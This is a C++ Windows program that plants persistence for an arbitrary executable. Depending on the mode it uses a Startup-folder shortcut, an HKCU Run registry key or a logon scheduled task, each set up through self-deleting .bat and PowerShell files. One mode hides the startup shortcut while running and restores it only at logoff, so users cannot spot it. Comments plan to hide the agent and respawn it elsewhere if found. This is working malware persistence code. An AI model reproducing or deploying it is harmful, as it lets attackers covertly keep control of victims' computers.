#include <iostream>
#include <conio.h>
#include <string>
#include <windows.h>
#include <fstream>
#include <shellapi.h>
#include <stdio.h>
#include <direct.h>
#include <Shlobj.h>

//3
#include <initguid.h>
#include <ole2.h>
#include <mstask.h>
#include <msterr.h>
#include <objidl.h>
#include <wchar.h>



using namespace std;

/*RUN COMMAND LINE or .bat file and get output, this blocks thread

string command = "f";
command += sourceExe;
command += "calc & notepad"; // &: run two command, &&: run if before command done
char *cmd = string_to_charstar(command);
char *output = string_to_charstar(exec(cmd));
*/


/*RUN POWERSHELL COMMAND or .bat file (can't get output), does not block thread

// When using char strings
ShellExecuteA(NULL, "open", "calc", NULL, NULL, SW_SHOW);
// When using wchar_t strings
ShellExecuteW(NULL, L"open", L"http://www.cplusplus.com/", NULL, NULL, SW_SHOW);
// When you aren't sure
ShellExecute(NULL, TEXT("open"), TEXT("calc"), NULL, NULL, SW_SHOW);
ex:
int nRet = (int)ShellExecuteA(NULL, "open", "a.bat", NULL, NULL, SW_SHOW);
if (nRet > 32) {
//OK
//cout << "OK";
}
else {
//error
}
*/

#define MAX_PATH 32767
#define MODE_YAZID

LPWSTR *szArglist;
string startupPathWithName = "C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\mainprocess.lnk"; //will change
string registryPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
string registryName = "mainprocess";
string taskName = "mainprocess";
string taskDescription = "";
string shortcutName = "mainprocess.lnk";
char *mode = (char *)malloc(5);

char* string_to_charstar(string str) {

	char *cstr = new char[str.length() + 1];
	strcpy(cstr, str.c_str()); //c_str() returns const char *
	return cstr;
}

string exec(const char* cmd) {
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (!feof(pipe)) {
			if (fgets(buffer, 128, pipe) != NULL)
				result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

/*
int main(int argc, char* argv[]) {


	//TODO copy agent.exe in ProgramData then link to it
	//TODO hide agent.exe
	//TODO if user find agent as sturtup can fined all files so agent must run another agent in another path

	//arg[0] is filepath (C:\Temp\filename.exe)
	//arg[1] is mode

	if (argc == 3) {

		const char *fileLocation = argv[1];
		string sourceExe(fileLocation); //char* to string

		if (argv[2][0] == '1') {

		}
		else if (argv[2][0] == '2') {

		}
	}
	_getch();
	return 0;
}
*/

void copy_shortcut();
void restore_shortcut();
void get_user_folder() {
	WCHAR p[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, p))) {
		char *name = (char *)malloc(MAX_PATH);
		wcstombs(name, p, MAX_PATH);
		string userpath(name);
		string usertillsturtup = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
		startupPathWithName = userpath;
		startupPathWithName += usertillsturtup;
		startupPathWithName += shortcutName;
	}
}

void freeMallocedMemory(void *str) {
	free(str);
}
#define INFO_BUFFER_SIZE 32767

void runCommandAndRemoveFiles() {
	exec("t.bat");
	remove("t.bat");
	remove("tt.ps1");

	/*
	int nRet = (int)ShellExecuteA(NULL, "open", "t.bat", NULL, NULL, SW_SHOW);
	if (nRet > 32) {
	//OK
	//cout << "OK";
	//remove("t.bat");
	//remove("tt.ps1");
	}
	else {
	//error
	}
	*/
}
void create_bat_forRunPowershell() {
	ofstream myfile;
	myfile.open("t.bat");
	myfile << "@echo off\n"
		"Powershell.exe -executionpolicy remotesigned -File  tt.ps1\n"
		//"set /p temp = \"Hit enter to continue\"\n"  //for dont close cmd
		"exit / b"
		;
	myfile.close();
}
void create_ps1_createShortcut(string sourceExe) {
	ofstream myfile;
	myfile.open("tt.ps1");
	myfile <<
		"$SourceExe = \""
		<< sourceExe <<
		"\"\n"
		"$DestinationPath = \""
		<< startupPathWithName <<
		"\"\n"
		"$WshShell = New-Object -comObject WScript.Shell\n"
		"$Shortcut = $WshShell.CreateShortcut($DestinationPath)\n"
		"$Shortcut.TargetPath = $SourceExe\n"
		"$Shortcut.Save()"
		;
	myfile.close();
}
void create_ps1_changeRegistry(string sourceExe) {
	ofstream myfile;
	myfile.open("tt.ps1");
	myfile <<
		"$registryPath = \""
		<< registryPath <<
		"\"\n"
		"$Name = \""
		<< registryName <<
		"\"\n"
		"$value = \""
		<< sourceExe <<
		"\"\n"
		"IF(!(Test-Path $registryPath)){\n"
		"	New-Item -Path $registryPath -Force | Out-Null\n"
		"	New-ItemProperty -Path $registryPath -Name $name -Value $value `\n"
		"	-Force | Out-Null\n"
		"}\n"
		"ELSE {\n"
		"	New-ItemProperty -Path $registryPath -Name $name -Value $value `\n"
		"	-Force | Out-Null\n"
		"}"
		;
	myfile.close();
}
void create_ps1_createTask(string sourceExe) {

	/*
	# The name of the scheduled task
	$TaskName = "MyScheduledTask2"
	# The description of the task
	$TaskDescr = "Run a powershell script through a scheduled task"
	# The Task Action command
	$TaskCommand = "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe"
	# The PowerShell script to be executed
	$TaskScript = "C:\Users\freedman\Desktop\temp.ps1"
	# The Task Action command argument
	$TaskArg = "-WindowStyle Hidden -NonInteractive -executionpolicy remotesigned -file $TaskScript"
 
	# The time when the task starts, for demonstration purposes we run it 1 minute after we created the task
	#$TaskStartTime = [datetime]::Now.AddMinutes(1) 
 
	# attach the Task Scheduler com object
	$service = new-object -ComObject("Schedule.Service")
	# connect to the local machine. 
	# http://msdn.microsoft.com/en-us/library/windows/desktop/aa381833(v=vs.85).aspx
	$service.Connect()
	$rootFolder = $service.GetFolder("\")
 
	$TaskDefinition = $service.NewTask(0) 
	$TaskDefinition.RegistrationInfo.Description = "$TaskDescr"
	$TaskDefinition.Settings.Enabled = $true
	$TaskDefinition.Settings.AllowDemandStart = $true
	$TaskDefinition.Principal.UserId = "WIN-09TLJEIQDM0\freedman"
	$TaskDefinition.Principal.LogonType = 3
 
	$triggers = $TaskDefinition.Triggers
	#http://msdn.microsoft.com/en-us/library/windows/desktop/aa383915(v=vs.85).aspx
	$trigger = $triggers.Create(9) # Creates a "LOGON" trigger
	$trigger.Id = "freedman"
	$trigger.UserId = "WIN-09TLJEIQDM0\freedman"
	#$trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
	#$trigger.Enabled = $true
 
	# http://msdn.microsoft.com/en-us/library/windows/desktop/aa381841(v=vs.85).aspx
	$Action = $TaskDefinition.Actions.Create(0)
	$action.Path = "$TaskCommand"
	$action.Arguments = "$TaskArg"
 
	#http://msdn.microsoft.com/en-us/library/windows/desktop/aa381365(v=vs.85).aspx
	$rootFolder.RegisterTaskDefinition("$TaskName",$TaskDefinition,6,$null,$null,3)
	*/

	


	/*
	Now if we wanted to run the Task more than just once, let’s say on a monthly basis,
	we have to change and add a bit of code  The code above uses Create(1) which means that the trigger is set to run once.

		$trigger = $triggers.Create(1) # Creates a "One time" trigger


		TASK_TRIGGER_EVENT 					0
		TASK_TRIGGER_TIME					1
		TASK_TRIGGER_DAILY 					2
		TASK_TRIGGER_WEEKLY					3
		TASK_TRIGGER_MONTHLY 				4
		TASK_TRIGGER_MONTHLYDOW				5
		TASK_TRIGGER_IDLE					6
		TASK_TRIGGER_REGISTRATION			7
		TASK_TRIGGER_BOOT					8
		TASK_TRIGGER_LOGON 					9
		TASK_TRIGGER_SESSION_STATE_CHANGE	11
	
		So let’s suppose we want to run the task the first day of every month, we then have to change the code as following.

		$trigger = $triggers.Create(4)
		$trigger.DaysOfMonth = 1
	*/



	/*
	If more than one action is required, just add an action, action path and action argument as in the example below.

	$Action = $TaskDefinition.Actions.Create(0)
	$action.Path = "$TaskCommand"
	$action.Arguments = "$TaskArg"
	$Action = $TaskDefinition.Actions.Create(0)
	$action.Path = "notepad.exe"
	$action.Arguments = ""
	*/



	/*
	The following code registers the scheduled task

	$rootFolder.RegisterTaskDefinition("$TaskName",$TaskDefinition,6,"System",$null,5)

	If the first parameter is set to $null, a random GUID is assigned as the Task name.

	The $Taskdefinition holds all the previously defined settings for the scheduled task.

	The value 6 referts to the task creation constant which means that Task Scheduler either registers the task as a new task or as an updated version
	if the task already exists. A complete listing of possible values can be found https://msdn.microsoft.com/en-us/library/windows/desktop/aa381365(v=vs.85).aspx.

	The next value defines the user context in wich the task runs

	The last value defines the logon type. 3 is TASK_LOGON_INTERACTIVE_TOKEN. A complete listing of possible values can be found https://msdn.microsoft.com/en-us/library/windows/desktop/aa383566(v=vs.85).aspx.
	*/




	/*
	Much simpler when using PowerShell version 4
	With PowerShell version 4 things get a bit simpler, to accomplish the same as in the aboe scrpt only 3 lines of code are needed.


	$TaskAction = New-ScheduledTaskAction -Execute "$TaskCommand" -Argument "$TaskArg" 
	$TaskTrigger = New-ScheduledTaskTrigger -At $TaskStartTime -Once
	Register-ScheduledTask -Action $TaskAction -Trigger $Tasktrigger -TaskName "$TaskName" -User "System" -RunLevel Highest

	*/
	TCHAR  infoBuf[INFO_BUFFER_SIZE];
	DWORD  bufCharCount = INFO_BUFFER_SIZE;
	if (!GetComputerName(infoBuf, &bufCharCount)) {
		return ;
	}
	char *name = (char *)malloc(INFO_BUFFER_SIZE);
	wcstombs(name, infoBuf, INFO_BUFFER_SIZE);
	string computerName(name);
	freeMallocedMemory(name);

	TCHAR  infoBuf2[INFO_BUFFER_SIZE];
	DWORD  bufCharCount2 = INFO_BUFFER_SIZE;
	if (!GetUserName(infoBuf2, &bufCharCount2)) {
		return ;
	}
	char *user = (char *)malloc(INFO_BUFFER_SIZE);
	wcstombs(user, infoBuf2, INFO_BUFFER_SIZE);
	string userName(user);
	freeMallocedMemory(user);

	ofstream myfile;
	myfile.open("tt.ps1");
	myfile <<
		"$TaskName = \""
		<< taskName <<
		"\"\n"
		"$TaskDescr = \""
		<< taskDescription <<
		"\"\n"
		"$TaskCommand = \""
		<< sourceExe <<
		"\"\n"
		"$TaskScript = \""
		<< "" <<
		"\"\n"
		"$TaskArg = \""
		<< "" <<
		"\"\n"
		"$service = new-object -ComObject(\"Schedule.Service\")\n"
		"$service.Connect()\n"
		"$rootFolder = $service.GetFolder(\"\\\")\n"
		"$TaskDefinition = $service.NewTask(0)\n"
		"$TaskDefinition.RegistrationInfo.Description = \"$TaskDescr\"\n"
		"$TaskDefinition.Settings.Enabled = $true\n"
		"$TaskDefinition.Settings.AllowDemandStart = $true\n"
		"$TaskDefinition.Principal.UserId = \""
		<< computerName <<
		"\\"
		<< userName <<
		"\"\n"
		"$TaskDefinition.Principal.LogonType = 3\n"
		"$triggers = $TaskDefinition.Triggers\n"
		"$trigger = $triggers.Create(9)\n"
		"$trigger.Id = \""
		<< userName <<
		"\"\n"
		"$trigger.UserId = \""
		<< computerName <<
		"\\"
		<< userName <<
		"\"\n"
		"$Action = $TaskDefinition.Actions.Create(0)\n"
		"$action.Path = \"$TaskCommand\"\n"
		"$action.Arguments = \"$TaskArg\"\n"
		"$rootFolder.RegisterTaskDefinition(\"$TaskName\", $TaskDefinition, 6, $null, $null, 3)"
		;
	myfile.close();
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
{
	// Register the window class.
	const wchar_t CLASS_NAME[] = L"Sample Window Class";
	WNDCLASS wc = {};
	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = CLASS_NAME;
	RegisterClass(&wc);
	// Create the window.
	HWND hwnd = CreateWindowEx(
		0,                              // Optional window styles.
		CLASS_NAME,                     // Window class
		L"Learn to Program Windows",    // Window text
		WS_OVERLAPPEDWINDOW,            // Window style
										// Size and position
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		NULL,       // Parent window    
		NULL,       // Menu
		hInstance,  // Instance handle
		NULL        // Additional application data
	);
	if (hwnd == NULL)
	{
		return 0;
	}




	// get args from cmd
	int nArgs;
	int i;
	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
	if (NULL == szArglist)
	{
		wprintf(L"CommandLineToArgvW failed\n");
		return 0;
	}
	else {
		//for (i = 0; i < nArgs; i++) printf("%d: %ws\n", i, szArglist[i]);
	}


	system("notepad");

	if (nArgs == 3) {

		char *fileLocation = (char *)malloc(MAX_PATH);
		wcstombs(fileLocation, szArglist[1], MAX_PATH);
		string sourceExe(fileLocation);

		wcstombs(mode, szArglist[2], 5);
		
		if (mode[0] == '1') {	//startup folder

			get_user_folder();

			create_bat_forRunPowershell();
			create_ps1_createShortcut(sourceExe);
			runCommandAndRemoveFiles();

		}
		else if (mode[0] == '2') {	//changeRegistry
			//string sourceExe is path you need
			create_bat_forRunPowershell();
			create_ps1_changeRegistry(sourceExe);
			runCommandAndRemoveFiles();
		}
		else if (mode[0] == '3') {	//task scheduled

			create_bat_forRunPowershell();
			create_ps1_createTask(sourceExe);
			runCommandAndRemoveFiles();


		}
		else if (mode[0] == '4') {


		}
		else if (mode[0] == '5') {


		}
	}

	
	
	// Free memory allocated for CommandLineToArgvW arguments.
	LocalFree(szArglist);

#ifdef MODE_YAZID

	if (mode[0] == '1') {
		copy_shortcut();
		remove(string_to_charstar(startupPathWithName));
	}

#endif




	// Run the message loop.
	MSG msg = {};
	while (GetMessage(&msg, NULL, 0, 0)) //pull a message
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

void copy_shortcut() {
	//make a sub folder
	char outDir[MAX_PATH] = "C:\\ProgramData\\temp";
	_mkdir(outDir);
	ifstream check;
	check.open(startupPathWithName);
	if (check.good()) {
		check.close();
		ifstream src(startupPathWithName, ios::binary);
		ofstream des("C:\\ProgramData\\temp\\mainprocess.lnk", ios::binary);

		//copy
		while (!src.eof()) {
			des.put(src.get());
		}
		src.close();
		des.close();
	}
}

void restore_shortcut() {
	ifstream check;
	check.open("C:\\ProgramData\\temp\\mainprocess.lnk");
	if (check.good()) {
		check.close();
		ofstream des(startupPathWithName, ios::binary);
		ifstream src("C:\\ProgramData\\temp\\mainprocess.lnk", ios::binary);

		//copy
		while (!src.eof()) {
			des.put(src.get());
		}
		src.close();
		des.close();
	}
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
		case WM_DESTROY:
			PostQuitMessage(0);
			return 0;

		case WM_PAINT:
			return 0;

		case WM_QUERYENDSESSION: //when logging off
		{
			
			
			#ifdef MODE_YAZID
				if (mode[0] == '1') {
					restore_shortcut();
				}
			#endif

			
			return true;
		}

	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}